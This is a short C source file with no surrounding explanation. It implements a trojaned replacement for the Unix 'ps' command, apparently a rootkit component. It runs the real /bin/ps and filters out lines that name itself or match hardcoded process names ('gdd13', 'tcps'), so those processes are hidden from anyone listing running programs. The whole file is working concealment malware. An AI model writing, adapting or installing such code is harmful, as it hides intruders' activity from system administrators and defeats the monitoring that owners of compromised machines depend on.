#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>

#define MAXLINE 1024
#define REAL_PS "/bin/ps"

char *process_list[]={
  "gdd13",
  "tcps",
  NULL
};

int main(int argc, char *argv[])
{
  char  buf[MAXLINE];
  char  psprocn[256], *ppsprocn;
  int   pp[2];
  pid_t pid;
  int   i, flgeof, flgchk=0;

  snprintf(psprocn, 256, "%s", REAL_PS);
  for (i=strlen(REAL_PS)-1; i>=0; i--)
    if (psprocn[i]=='/') break;
  ppsprocn=psprocn+i+1;
  pipe(pp);
  if ((pid=fork()) == -1) return 1;
  else if (pid>0) {
    close(pp[1]);
    for (;;) {
      for (flgeof=i=0; i<MAXLINE-1; i++) {
        if (read(pp[0], buf+i, 1) != 1) {
          flgeof=1; break;
        }
        if (buf[i] == '\n') break;
      }
      buf[i]='\n';
      if (flgeof && !strlen(buf)) break;
      if (i==MAXLINE-1) {
        printf("%s", buf);
        flgchk=1;
        continue;
      }
      if (flgchk) {
        printf("%s\n", buf);
        flgchk=0;
      } else {
        if (!strstr(buf, ppsprocn)) {
          for (i=0;;i++)
            if (process_list[i] == NULL) {
              printf("%s\n", buf);
              break;
            } else if (strstr(buf, process_list[i]))
              break;
        }
      }
      if (flgeof) break;
    }
    close(pp[0]);
  } else {
    close(1);
    dup(pp[1]);
    close(pp[1]);
    close(pp[0]);
    execv(REAL_PS, argv);
  }
  return 0;
}

